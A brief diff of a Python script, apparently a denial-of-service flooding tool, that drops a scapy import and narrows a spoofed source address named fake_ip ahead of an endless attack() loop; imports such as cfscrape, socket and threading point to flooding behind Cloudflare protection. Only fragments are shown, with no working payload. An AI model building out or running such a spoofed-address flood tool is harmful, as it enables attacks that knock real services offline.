@@ -15,7 +15,6 @@ import sys, glob, time, requests, ssl, webbrowser
 import bz2, datetime, wget, json, cfscrape, urllib3
 from colorama import Fore
 from time import sleep
-from scapy.all import *
 import base64 as b64
 import socket, threading
 from threading import Thread
@@ -71,7 +70,7 @@ clear()
 print("\033[93m")
 #########################################################################
 
-fake_ip = '77.109.33.232','127.0.0.1'
+fake_ip = '77.109.33.232'
 
 def attack():
     while True:
